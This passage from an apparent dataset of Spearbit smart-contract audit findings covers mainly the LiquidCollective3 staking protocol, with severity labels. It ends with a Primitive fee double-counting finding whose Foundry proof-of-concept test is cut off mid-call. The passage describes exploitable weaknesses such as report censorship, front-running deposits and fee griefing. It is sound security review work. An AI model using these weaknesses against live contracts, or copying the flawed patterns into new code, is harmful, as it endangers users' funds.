suppliedRedeemManagerDemandInEth}(suppliedRedeemManagerDemand); // we burn the shares of the redeem manager associated with the amount of eth provided _burnRawShares(address(RedeemManagerAddress.get()), suppliedRedeemManagerDemand);", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "OracleManager allows reporting for the same epoch multiple times, leading to unknown behavior.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Currently, it is possible for the oracle to report on the same epoch multiple times, because _- isValidEpoch checks that the report's epoch >= LastConsensusLayerReport.get().epoch. This can lead the contract to unspecified behavior  The code will revert if the report increases the balance, not with an explicit check but reverting due to a subtraction underflow, since maxIncrease == 0 and  Allowing other code paths to execute to completion.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Missing event emit when user calls deposit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Whenever BalanceToDeposit is updated, the protocol should emit a SetBalanceToDeposit, but when a user calls UserDepositManager.deposit, the event is never emitted which could break tooling.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Reset the report data and increment the last epoch id before calling River's setConsensusLayerData when a quorum is made", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The current implementation of reportConsensusLayerData calls river.setConsensusLayerData(report) first when a quorum is made then resets the report variant and position data and also it increment the last epoch id afterward // if adding this vote reaches quorum if (variantVotes + 1 >= quorum) { // we push the report to river river.setConsensusLayerData(report); // we clear the reporting data _clearReports(); // we increment the lastReportedEpoch to force reports to be on the last frame LastEpochId.set(lastReportedEpochValue + 1); emit SetLastReportedEpoch(lastReportedEpochValue + 1); } In the future version of the protocol there might be a possibility for an oracle member to call back into reportCon- sensusLayerData when river.setConsensusLayerData(report) is called and so it would open a reentrancy for compromised/malicious oracle members.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Update BufferedExceedingEth before calling sendRedeemManagerExceedingFunds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "In pullExceedingEth , River's sendRedeemManagerExceedingFunds is called before updating the RedeemManager's BufferedExceedingEth storage value _river().sendRedeemManagerExceedingFunds{value: amountToSend}(); BufferedExceedingEth.set(BufferedExceedingEth.get() - amountToSend);", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Any oracle member can censor almost quorum report variants by resetting its address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The admin or an oracle member can DoS or censor almost quorum reports by calling setMember endpoint which would reset the report variants and report positions. The admin also can reset the/clear the reports by calling other endpoints by that should be less of an issue compared to just an oracle member doing that.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Incentive mechanism that encourages operators to respond quickly to exit requests might diminish under certain condition", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "/// @notice Retrieve all the active and fundable operators /// @dev This method will return a memory array of length equal to the number of operator, but /// @dev populated up to the fundable operator count, also returned by the method /// @return The list of active and fundable operators /// @return The count of active and fundable operators function getAllFundable() internal view returns (CachedOperator[] memory, uint256) { // uint32[] storage stoppedValidatorCounts = getStoppedValidators(); for (uint256 idx = 0; idx < operatorCount;) { _hasFundableKeys(r.value[idx]) && _getStoppedValidatorCountAtIndex(stoppedValidatorCounts, idx) >= r.value[idx].requestedExits only @audit-ok File: Operators.2.sol 153: 154: ,! 155: 156: 157: 158: ,! ..SNIP.. 172: 173: 174: 175: 176: 177: ,! 178: if ( ) { r.value[idx].requestedExits is the accumulative number of requested validator exits by the protocol _getStoppedValidatorCountAtIndex(stoppedValidatorCounts, idx) function is a value reported by oracle members which consist of both exited and slashed validator counts It was understood the rationale of having the _getStoppedValidatorCountAtIndex(stoppedValidatorCounts, idx) >= r.value[idx].requestedExits conditional check at Line 177 above is to incentivize operators to re- In other words, an operator with a re- spond quickly to exit requests if they want new stakes from deposits. questedExits value larger than the _getStoppedValidatorCountAtIndex count indicates that an operator did not submit exit requests to the Consensus Layer (CL) in a timely manner or the exit requests have not been finalized in CL. However, it was observed that the incentive mechanism might not work as expected in some instances. Consider the following scenario: Assuming an operator called A has 5 slashed validators and 0 exited validators, the _getStoppedValidator- CountAtIndex function will return 5 for A since this function takes into consideration both stopped and slashed validators. Also, assume that the requestedExits of A is 5, which means that A has been instructed by the protocol to submit 5 exit requests to CL. In this case, the incentive mechanism seems to diminish as A will still be considered a fundable operator even if A does not respond to exit requests since the number of slashed validators is enough to \"help\" to push up the stopped validator count to satisfy the condition, giving the wrong impression that A has already submitted the exit requests. As such, A will continue to be selected to stake new deposits.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "RedeemManager. _claimRedeemRequests transaction sender might be tricked to pay more eth in trans- action fees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The _claimRedeemRequests function is designed to allow anyone to claim ETH on behalf of another party who has a valid redeem request. The function iterates through the redeemRequestIds list and fulfills each request individually. However, it is important to note that the transfer of ETH to the recipients is only limited by the 63/64 rule, which means that it is possible for a recipient to take advantage of a heavy fallback function and potentially cause the sender to pay a significant amount of unwanted transaction fees.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Claimable LsETH on the Withdraw Stack could exceed total LsETH requested on the Redeem Queue", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Let the total amount of claimable LsETH on the Withdraw Stack be x and the total amount of LsETH requested on the Redeem Queue be y. The following points are extracted from the Withdrawals Smart Contract Architecture documentation:  The design ensures that x <= y . Refer to page 15 of the documentation.  It is impossible for a redeem request to be claimed before at least one Oracle report has occurred, so it is impossible to skip a slashing time penalty. Refer to page 16 of the documentation. Based on the above information, the main purpose of the design (x <= y) is to avoid favorable treatment of LsETH holders that would request a redemption before others following a slashing incident. However, this constraint (x <= y ) is not being enforced in the contract. The reporter could continue to report withdrawal via the RedeemManager.reportWithdraw function till the point x > y. If x > y, LsETH holders could request a redemption before others following a slashing incident to gain an advan- tage.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "An oracle member can resubmit data for the same epoch multiple times if the quorum is set to 1", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "If the quorum is set to 1 and the difference between the report's epoch e and LastEpochId.get() is (cid:1)e, an oracle member will be able to call reportConsensusLayerData (cid:1)e + 1 times to push its report for epoch e to the protocol and with different data each time (only restriction on successive reports is that the difference of underlying balance between reports would need to be negative since the maxIncrease will be 0). Note that in reportConsensusLayerData the first storage write to LastEpochId will be overwritten later due to quorum of one: x = LastEpochId -> report.epoch -> x + 1", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Report's validatorsCount's historical non-decreseness does not get checked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Once the Oracle members come to a quorum for a selected report variant, the validators count is stored in the storage. Note that validatorsCount is supposed to represent the total cumulative number of validators ever funded on consensus layer (even if they have been slashed or exited at some point ). So this value is supposed to be a non-decreasing function of reported epochs. But this invariant has never been checked in setConsensusLayerData.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "The report's slashingContainmentMode and bufferRebalancingMode are decided by the oracle mem- bers which affects the exiting strategy of validators", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The current protocol leaves it up to the oracle members to come to a quorum to set either of the report.slashingContainmentMode or report.bufferRebalancingMode to true or false. That means the oracle members have the power to decide off-chain whether validators should be exited and whether some of the deposit balance should be reallocated for redeeming (vs an algorithmic decision by the protocol on-chain). A potential bad scenario would be oracle members deciding to not signal for new validators to exit and from the time for the current epoch to the next report some validators get penalized or slashed which would reduce the If those validators would have exited before getting slashed or penalized, the underlying value of the shares. redeemers would have received more ETH back for their investment.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Anyone can call depositToConsensusLayer and potentially push wrong data on-chain", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Anyone can call depositToConsensusLayer and potentially push wrong data on-chain. An example is when an operator would want to remove a validator key that is not-funded yet but has an index below the operator limit and will be picked by the strategy if depositToConsensusLayer is called. Then anyone can front run the removal call by the operator and force push this validator's info to the deposit contract.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Calculation of currentMaxCommittableAmount can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "currentMaxCommittableAmount is calculated as: // we adapt the value for the reporting period by using the asset balance as upper bound uint256 underlyingAssetBalance = _assetBalance(); uint256 currentBalanceToDeposit = BalanceToDeposit.get(); ... uint256 currentMaxCommittableAmount = LibUint256.min( LibUint256.min(underlyingAssetBalance, (currentMaxDailyCommittableAmount * period) / 1 days), currentBalanceToDeposit ); But underlyingAssetBalance is Bu = Bv +Bd +Bc +Br +32(Cd (cid:0)Cr ) which is greater than currentBalanceToDeposit Bd since the other components are non-negative values. parameter description Bv Bd Bc Br Cd Cr M m Bu LastConsensusLayerReport.get().validatorsBalance BalanceToDeposit.get() CommittedBalance.get() BalanceToRedeem.get() DepositedValidatorCount.get() LastConsensusLayerReport.get().validatorsCount currentMaxCommittableAmount currentMaxDailyCommittableAmount * period) / 1 days underlyingAssetBalance Note that the fact that Cd (cid:21) Cr is an invariant that is enforced by the protocol. and so currently we are computing M as: M = min(Bu, Bd , m) = min(Bd , m) since Bu (cid:21) Bd .", "labels": ["Spearbit", "LiquidCollective3", "Severity: Gas Optimization"]}, {"title": "Remove redundant array length check and variable to save gas.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "When someone calls ConsensusLayerDepositManager.depositToConsensusLayer, the contract will verify that the receivedSignatureCount matches the receivedPublicKeyCount returned from _getNextVal- idators. This is unnecessary as the code always creates them with the same length.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Gas Optimization"]}, {"title": "Duplicated events emitted in River and RedeemManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The amount of ETH pulled from the redeem contract when setConsensusData is called by the oracle is notified with events in both RedeemManager and River contracts.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Gas Optimization"]}, {"title": "totalRequestedExitsValue's calculation can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "In the for loop in this context, totalRequestedExitsValue is updated for every operator that sat- isfies _getActiveValidatorCountForExitRequests(operators[idx]) == highestActiveCount. Based on the used increments, their sum equals to optimalTotalDispatchCount.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Gas Optimization"]}, {"title": "Report's bufferRebalancingMode and slashingContainmentMode are only used during the reporting transaction process", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "report.bufferRebalancingMode and report.slashingContainmentMode are only used during the transaction and their previous values are not used in the protocol. They can be removed from being added to the stored report. Note that their historical values can be queried by listening to the ProcessedConsensusLayerReport(report, vars.trace) events.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Gas Optimization"]}, {"title": "Add more comments/documentation for ConsensusLayerReport and StoredConsensusLayerReport structs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The ConsensusLayerReport and StoredConsensusLayerReport structs are defined as /// @notice The format of the oracle report struct ConsensusLayerReport { uint256 epoch; uint256 validatorsBalance; uint256 validatorsSkimmedBalance; uint256 validatorsExitedBalance; uint256 validatorsExitingBalance; uint32 validatorsCount; uint32[] stoppedValidatorCountPerOperator; bool bufferRebalancingMode; bool slashingContainmentMode; } /// @notice The format of the oracle report in storage struct StoredConsensusLayerReport { uint256 epoch; uint256 validatorsBalance; uint256 validatorsSkimmedBalance; uint256 validatorsExitedBalance; uint256 validatorsExitingBalance; uint32 validatorsCount; bool bufferRebalancingMode; bool slashingContainmentMode; } Comments regarding their specified fields are lacking.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "postUnderlyingBalanceIncludingExits and preUnderlyingBalanceIncludingExits can be removed from setConsensusLayerData", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Both postUnderlyingBalanceIncludingExits ( Bpost ) and preUnderlyingBalanceIncludingEx- its ( Bpre ) include the accumulated skimmed and exited amounts overtime which part of them might have exited the protocol through redeeming (or skimmed back to CL and penalized). Their delta is almost the same as the delta of vars.postReportUnderlyingBalance and vars.preReportUnderlyingBalance (almost if one adds a check for non-decreases of validator counts). u u : postUnderlyingBalanceIncludingExits u : preUnderlyingBalanceIncludingExits u (cid:0) Bpre u : vars.postReportUnderlyingBalance : vars.preReportUnderlyingBalance : Breport,post (cid:0) Breport,pre u u  Bpost u  Bpre  (cid:1)Bu: Bpost  Breport,post  Breport,pre u  (cid:1)Breport u  Bprev v : u  Bcurr v  (cid:1)Bv : Bcurr  Bprev s  Bcurr s  (cid:1)Bs: Bcurr  Bprev e  Bcurr e  (cid:1)Be: Bcurr previous reported/stored value for total validator balances in CL LastConsensusLayerRe- port.get().validatorsBalance v (cid:0) Bprev v (can be negative) : current reported value of total validator balances in CL report.validatorsBalance : LastConsensusLayerReport.get().validatorsSkimmedBalance : report.validatorsSkimmedBalance s (cid:0) Bprev s (always non-negative, this is an invariant that gets checked). : LastConsensusLayerReport.get().validatorsExitedBalance : report.validatorsExitedBalance e (cid:0) Bprev e (always non-negative, this is an invariant that gets checked).  $C{prev} $: LastConsensusLayerReport.get().validatorsCount  Ccurr : report.validatorsCount  (cid:1)C: Ccurr (cid:0) Cprev (this value should be non-negative, note this invariant has not been checked in the code- base)  Cdeposit : DepositedValidatorCount.get()  Bd : BalanceToDeposit.get() 22  Bc: CommittedBalance.get()  Br : BalanceToRedeem.get() Note that the above values are assumed to be in their form before the current report gets stored in the storage. Then we would have Bpost u = Bcurr v + Bcurr s + Bcurr e = Bpre u + (cid:1)Bv + (cid:1)Bs + (cid:1)Be (cid:0) 32(cid:1)C and so: (cid:1)Bu = (cid:1)Bv + (cid:1)Bs + (cid:1)Be (cid:0) 32(cid:1)C = (cid:1)Breport u", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "The formula or the parameter names for calculating currentMaxDailyCommittableAmount can be made more clear", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "currentMaxDailyCommittableAmount is calculated using the below formula: // we compute the max daily committable amount by taking the asset balance without the balance to deposit into account ,! uint256 currentMaxDailyCommittableAmount = LibUint256.max( dcl.maxDailyNetCommittableAmount, (uint256(dcl.maxDailyRelativeCommittableAmount) * (underlyingAssetBalance - ,! currentBalanceToDeposit)) / LibBasisPoints.BASIS_POINTS_MAX ); Therefore its value is the maximum of two potential maximum values.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "preExitingBalance is a rough estimate for signalling the number of validators to request to exit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "exitingBalance and preExitingBalance might be trying to compensate for the same portion of balance (non-stopped validators which have been signaled to exit and are in the CL exit queue). That means the number of validatorCountToExit calculated to accommodate for the redeem demand is actually lower than what is required. The important portion of preExitingBalance is for the validators that were singled to exit in the previous reporting round but the operators have not registered them for exit in CL. Also totalStoppedValidatorCount can include slashed validator counts which again lowers the required validatorCountToExit and those values should not be accounted for here. Perhaps the oracle members should also report the slashing counts of validators so that one can calculate these values more accurately.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "More documentation can be added regarding the currentMaxDailyCommittableAmount calculation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "currentMaxDailyCommittableAmount calculated as // we compute the max daily committable amount by taking the asset balance without the balance to deposit into the account ,! uint256 currentMaxDailyCommittableAmount = LibUint256.max( dcl.maxDailyNetCommittableAmount, (uint256(dcl.maxDailyRelativeCommittableAmount) * (underlyingAssetBalance - ,! currentBalanceToDeposit)) / LibBasisPoints.BASIS_POINTS_MAX ); We can add further to the comment: Since before the _commitBalanceToDeposit hook is called we have skimmed the remaining to redeem balance to BalanceToDeposit, underlyingAssetBalance - currentBalanceToDeposit represent the funds allocated for CL (funds that are already in CL, funds that are in transit to CL or funds committed to be deposited to CL). It is important that the redeem balance is already skimmed for this upper bound calculation, so for future code changes we should pay attention to the order of hook callbacks otherwise the upper bounds would be different.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "BalanceToRedeem is only non-zero during a report processing transaction", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "BalanceToRedeem is only ever posses a non-zero value during the report processing when a quorum has been made for the oracle member votes (setConsensusLayerData). And at the very end of this process its value gets reset back to 0.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Improve clarity on bufferRebalancingMode variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "According to the documentation, the bufferRebalancingMode flag passed by the oracle should allow or disallow the rebalancing of funds between the Deposit and Redeem buffers. The flag correctly disables rebalancing in the DepositBuffer to RedeemBuffer direction as can be seen here if (depositToRedeemRebalancingAllowed && availableBalanceToDeposit > 0) { uint256 rebalancingAmount = LibUint256.min( availableBalanceToDeposit, redeemManagerDemandInEth - exitingBalance - availableBalanceToRedeem ); if (rebalancingAmount > 0) { availableBalanceToRedeem += rebalancingAmount; _setBalanceToRedeem(availableBalanceToRedeem); _setBalanceToDeposit(availableBalanceToDeposit - rebalancingAmount); } } but it is not used at all when pulling funds in another way // if funds are left in the balance to redeem, we move them to the deposit balance _skimExcessBalanceToRedeem();", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Fix code style consistency issues", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "There is a small code styling mismatch between the new code under audit and the style used through the rest of the code. Specifically, function parameter names are supposed to be prepended with _ to differentiate them from variables defined in the function body.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Remove unused constants", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "DENOMINATION_OFFSET is unused and can be removed from the codebase.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Document what TotalRequestedExits can potentially represent", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Documentation is lacking for TotalRequestedExits. This parameter represents a quantity that is a mix of exited (or to be exited) and slashed validators for an operator. Also, in general, this is a rough quantity since we don't have a finer reporting of slashed and exited validators (they are reported as a sum).", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Operators need to listen to RequestedValidatorExits and exit their validators accordingly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Operators need to listen to RequestedValidatorExits and exit their validators accordingly emit RequestedValidatorExits(operators[idx].index, requestedExits + operators[idx].picked); Note that requestedExits + operators[idx].picked represents the upper bound for the index of the funded validators that need to be exited by the operator.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Oracle members would need to listen to ClearedReporting and report their data if necessary", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Oracle members would need to listen to ClearedReporting event and report their data if necessary", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "The only way for an oracle member to change its report data for an epoch is to reset the reporting process by changing its address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "If an oracle member has made a mistake in its CL report to the Oracle or for some other reason would like to change its report, it would not be able to due to the following if block: // we retrieve the voting status of the caller, and revert if already voted if (ReportsPositions.get(uint256(memberIndex))) { revert AlreadyReported(report.epoch, msg.sender); } The only way for the said oracle member to be able to report different data is to reset its address by calling setMember. This would cause all the report variants and report positions to be cleared and force all the other oracle members to report their data again. Related:  Any oracle member can censor almost quorum report variants by resetting its address.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "For a quorum making CL report the epoch restrictions are checked twice.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "When an oracle member reports to the Oracle's reportConsensusLayerData, the requirements for a valid epoch is checked once in reportConsensusLayerData: // checks that the report epoch is not invalid if (!river.isValidEpoch(report.epoch)) { revert InvalidEpoch(report.epoch); } and once again in setConsensusLayerData // we start by verifying that the reported epoch is valid based on the consensus layer spec if (!_isValidEpoch(cls, report.epoch)) { revert InvalidEpoch(report.epoch); } Note that only the Oracle can call the setConsensusLayerData endpoint and the only time the Oracle makes this call is when the quorum is reached in reportConsensusLayerData.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Clear report variants and report position data during the migration to the new contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Upon migration to the new contract with a new type of reporting data the old report positions and variants should be cleared by calling _clearReports() on the new contract or an older counterpart on the old contract. Note that the report variants slot will be changed from: bytes32(uint256(keccak256(\"river.state.reportsVariants\")) - 1) to: bytes32(uint256(keccak256(\"river.state.reportVariants\")) - 1)", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Remove unused functions from Oracle", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The following functions are unused and can be removed from the Oracle's implementation  isValidEpoch  getTime  getExpectedEpochId  getLastCompletedEpochId  getCurrentEpochId  getCLSpec  getCurrentFrame  getFrameFirstEpochId  getReportBounds", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "RedeemManager. _claimRedeemRequests - Consider adding the recipient to the revert message in case of failure", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The purpose of the _claimRedeemRequests function is to facilitate the claiming of ETH on behalf of another party who has a valid redeem request. It is worth noting that if any of the calls to recipients fail, the entire transaction will revert. Although it is impossible to conduct a denial-of-service (DoS) attack in this scenario, as the worst-case scenario only allows the transaction sender to specify a different array of redeemRequestIds, it may still be challenging to determine the specific redemption request that caused the transaction to fail.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Exit validator picking strategy does not consider slashed validator between reported epoch and current epoch", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The current picking strategy in the OperatorsRegistry._pickNextValidatorsToExitFromActive- Operators function relies on a report from an old epoch. In between the reported epoch and the current epoch, validators might have been slashed and so the strategy might pick and signal to the operators those validators that have been slashed. As a result, the suggested number of validators to exit the protocol to compensate for the redemption demand in the next round of reports might not be exactly what was requested. Similarly, the OperatorsV2._hasExitableKeys function only evaluates based on a report from an old epoch. In between the reported epoch and the current epoch, validators might have been slashed. Thus, some returned operators might not have exitable keys in the current epoch.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Duplicated functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "_getStoppedValidatorsCountFromRawArray functions are the same. Operator.2._getStoppedValidatorCountAtIndex The and OperatorsRegistry.1. 30 function _getStoppedValidatorCountAtIndex(uint32[] storage stoppedValidatorCounts, uint256 if (index + 1 >= stoppedValidatorCounts.length) { return 0; } return stoppedValidatorCounts[index + 1]; function _getStoppedValidatorsCountFromRawArray(uint32[] storage stoppedValidatorCounts, internal view returns (uint32) index) File: Operators.2.sol 142: ,! 143: 144: 145: 146: 147: 148: 149: 150: 151: } { uint256 operatorIndex) internal view returns (uint32) File: OperatorsRegistry.1.sol 484: ,! 485: 486: 487: 488: 489: 490: 491: 492: 493: return 0; } { if (operatorIndex + 1 >= stoppedValidatorCounts.length) { } return stoppedValidatorCounts[operatorIndex + 1];", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Funds might be pulled from CoverageFundV1 even when there has been no slashing incident.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "vars.availableAmountToUpperBound might be positive even though no validators have been slashed. In this case, we still pull funds from the coverage funds contract to get closer to the upper bound limit: // if we have available amount to upper bound after pulling the exceeding eth buffer, we attempt to pull coverage funds ,! if (vars.availableAmountToUpperBound > 0) { // we pull the funds from the coverage recipient vars.trace.pulledCoverageFunds = _pullCoverageFunds(vars.availableAmountToUpperBound); // we do not update the rewards as coverage is not considered rewards // we do not update the available amount as there are no more pulling actions to perform afterwards } So it is possible the slashed coverage funds get used even when there has been no slashing to account for.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Update inline documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": " OracleManager.1.sol functions highlighted in Context are missing the @return natspec.  IOracle.1.sol#L204's highlighted comment is outdated. setMember can now also be called by the member itself. Also, there is a typo: adminitrator -> administrator. File: IOracle.1.sol 204: 209: /// @dev Only callable by the adminitrator @audit typo and outdated function setMember(address _oracleMember, address _newAddress) external; modifier onlyAdminOrMember(address _oracleMember) { if (msg.sender != _getAdmin() && msg.sender != _oracleMember) { revert LibErrors.Unauthorized(msg.sender); File: Oracle.1.sol 28: 29: 30: 31: 32: 33: ... 189: ,! } _; } function setMember(address _oracleMember, address _newAddress) external onlyAdminOrMember(_oracleMember) {", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Document/mark unused (would-be-stale) storage parameters after migration", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The following storage parameters will be unused after the migration of the protocol to v1  CLValidatorCount  CLValidatorTotalBalance  LastOracleRoundId.sol  OperatorsV1, this will be more than one slot (it occupies regions of storage)  ReportVariants, the slot has been changed (that means right after migration ReportVariants will be an empty array by default): bytes32(uint256(keccak256(\"river.state.reportsVariants\")) - 1); - bytes32 internal constant REPORTS_VARIANTS_SLOT = ,! + bytes32 internal constant REPORT_VARIANTS_SLOT ,! = bytes32(uint256(keccak256(\"river.state.reportVariants\")) - 1);", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "pullEth, pullELFees and pullExceedingEth do not check for a non-zero amount before sending funds to River", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "pullCoverageFunds makes sure that the amount sending to River is non-zero before calling its corresponding endpoint. This behavior differs from the implementations of  pullELFees  pullExceedingEth  pullEth 33 Not checking for a non-zero value has the added benefit of saving gas when the value is non-zero, while the check for a non-zero value before calling back River saves gas for cases when the amount could be 0.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Protocol fees are double-counted as registry balance and pool reserve", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "When swapping, the registry is credited a protocolFee. However, this fee is always reinvested in the pool, meaning the virtualX or virtualY pool reserves per liquidity increase by protocolFee / liquidity. The protocol fee is now double-counted as the registrys user balance and the pool reserve, while the global reserves are only increased by the protocol fee once in _increaseReserves(_state.tokenInput, iteration.input). A protocol fee breaks the invariant that the global reserve should be greater than the sum of user balances and fees plus the sum of pool reserves. As the protocol fee is reinvested, LPs can withdraw them. If users and LPs decide to withdraw all their balances, the registry cant withdraw their fees anymore. Conversely, if the registry withdraws the protocol fee, not all users can withdraw their balances anymore. // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { function test_protocol_fee_reinvestment() public noJit defaultConfig useActor usePairTokens(100e18) allocateSome(10e18) // deltaLiquidity isArmed { // Set fee, 1/5 = 20% SimpleRegistry(subjects().registry).setFee(address(subject()), 5); // swap // make invariant go negative s.t. all fees are reinvested, not strictly necessary vm.warp(block.timestamp + 1 days); uint128 amtIn = 1e18; bool sellAsset = true; uint128 amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)); subject().multiprocess(FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, ,! uint8(sellAsset ? 1 : 0))); // deallocate and earn reinvested LP fees + protocol fees, emptying _entire_ reserve including protocol fees ,! subject().multiprocess( 